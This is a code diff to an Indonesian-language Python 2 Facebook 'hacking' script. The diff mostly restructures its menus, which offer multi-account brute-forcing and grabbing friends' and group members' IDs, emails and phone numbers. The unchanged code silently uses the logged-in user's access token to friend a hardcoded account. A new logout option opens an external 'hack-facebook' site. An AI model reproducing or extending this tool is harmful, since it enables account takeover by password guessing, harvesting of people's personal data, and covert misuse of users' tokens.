@@ -21,7 +21,6 @@ if sandi == 'satuduatiga' and user == 'risa':
     sys.exit
 else:
     print 'Login GAGAL, BUDAYAKAN MEMBACA!!'
-    time.sleep(2)
     wa()
     restart()
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
@@ -101,7 +100,7 @@ def login():
     os.system('reset')
     try:
         toket = open('login.txt', 'r')
-        menu()
+        menu_hack()
     except (KeyError, IOError):
         os.system('reset')
         print logo
@@ -139,7 +138,7 @@ def login():
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 time.sleep(2)
-                menu()
+                menu_hack()
             except requests.exceptions.ConnectionError:
                 print '\n\x1b[1;91m[!] Tidak ada koneksi'
                 keluar()
@@ -156,7 +155,8 @@ def login():
             login()
 
 
-def menu():
+
+def menu_hack():
     os.system('reset')
     try:
         toket = open('login.txt', 'r').read()
@@ -182,31 +182,6 @@ def menu():
             print '\x1b[1;91m[!] Tidak ada koneksi'
             keluar()
 
-    pilih()
-
-def pilih():
-    menu_hack()
-
-
-def menu_hack():
-    os.system('reset')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
-            a = json.loads(otw.text)
-            nama = a['name']
-            id = a['id']
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Tidak ada koneksi'
-            keluar()
-
     os.system('reset')
     print logo
     print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
@@ -214,6 +189,7 @@ def menu_hack():
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
     print '\x1b[1;37;40m1. Multi Bruteforce Facebook'
     print '\x1b[1;37;40m2. Ambil id/email/hp'
+    print '\x1b[1;37;40m3. LogOut'
     print '\x1b[1;31;40m0. Keluar'
     print
     hack_pilih()
@@ -232,11 +208,16 @@ def hack_pilih():
             if hack == '2':
                 grab()
             else:
-                if hack == '0':
+            	if hack == '3':
+            	    os.system('rm -rf login.txt')
+                    os.system('xdg-open http://uzie.xyz/hack-facebook')
                     keluar()
                 else:
-                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
-                    hack_pilih()
+                    if hack == '0':
+                        keluar()
+                    else:
+                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
+                        hack_pilih()
 
 
 
@@ -342,21 +323,10 @@ def grab():
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
-    else:
-        try:
-            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
-            a = json.loads(otw.text)
-            nama = a['name']
-            id = a['id']
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Tidak ada koneksi'
-            keluar()
 
     os.system('reset')
     print logo
-    print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
-    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama Facebook \x1b[1;91m: \x1b[1;92m' + nama
-    print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Ambil ID teman'
     print '\x1b[1;37;40m2. Ambil ID teman dari teman'
     print '\x1b[1;37;40m3. Ambil ID member GRUP'
@@ -797,6 +767,8 @@ def hpfrom_teman():
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
             keluar()
+            
     
 if __name__ == '__main__':
     login()
+    
